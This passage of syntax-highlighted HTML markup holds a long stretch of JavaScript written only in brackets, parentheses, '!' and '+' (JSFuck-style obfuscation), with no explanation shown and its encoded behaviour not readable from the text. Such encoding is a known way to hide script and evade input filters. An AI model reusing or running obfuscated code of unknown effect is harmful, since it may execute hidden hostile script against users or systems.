class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token 